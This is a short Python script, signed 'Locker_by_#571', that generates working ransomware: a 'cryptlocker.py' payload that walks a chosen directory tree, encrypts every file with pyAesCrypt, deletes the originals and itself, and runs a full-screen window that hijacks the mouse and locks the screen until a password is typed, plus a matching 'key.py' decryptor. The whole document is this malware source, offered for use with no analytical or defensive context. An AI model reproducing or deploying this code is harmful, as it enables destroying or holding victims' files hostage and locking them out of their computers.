direct=input("Write the root directory for crypt: ")
password=input("Write the password for crypter: ")
pasw=input("Write the password for locker: ")
with open("cryptlocker.py","w") as crypt: 
	crypt.write('''
import os, sys, pyAesCrypt
from threading import *
from pyautogui import click, moveTo
from tkinter import Tk,Entry,Label
from time import sleep
def locker():
	def callback(event):
		global k,entry
		if entry.get()=="'''+str(pasw)+'''": k=True
	def block(void):
		click(675, 420)
		moveTo(675, 420)
		root.attributes("-fullscreen",True)
		root.protocol("WM_DELETE_WINDOW", block)
		root.update()
		root.bind('<Control-KeyPress-c>', callback)
	global k,entry
	root = Tk()
	root.title("Locker")
	root.attributes("-fullscreen",True)
	entry = Entry(root,font=1)
	label0=Label(root,text="Locker_by_#571",font=1)
	label0.grid(row=0,column=0)
	label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20')
	label1.place(x=470,y=300)
	entry.place(width=150,height=50,x=600,y=400)
	root.update(); sleep(0.2)
	click(675, 420)
	k=False
	while k!=True: block(None)
def crypter():
	def crypt(file):
		password="'''+str(password)+'''"
		bufferSize = 512*1024
		pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
		print("[crypted] '"+str(file)+".crp'")
		os.remove(file)
	def walk(dir):
		for name in os.listdir(dir):
			path = os.path.join(dir, name)
			if os.path.isfile(path): crypt(path)
			else: walk(path)
	walk("'''+str(direct)+'''")
	os.remove(str(sys.argv[0]))
thread_1 = Thread(target=locker)
thread_2 = Thread(target=crypter)
thread_1.start(); thread_2.start()
thread_1.join(); thread_2.join()
''') 
	print("[+] File 'cryptlocker.py' successfully saved!")
with open("key.py","w") as key: 
	key.write('''
import os, sys
def decrypt(file):
	import pyAesCrypt
	password="'''+str(password)+'''"
	bufferSize = 512*1024 
	pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize)
	print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path): 
			try: decrypt(path)
			except: pass
		else: walk(path)
walk("'''+str(direct)+'''")
os.remove(str(sys.argv[0]))
''')
	print("[+] File 'key.py' successfully saved!")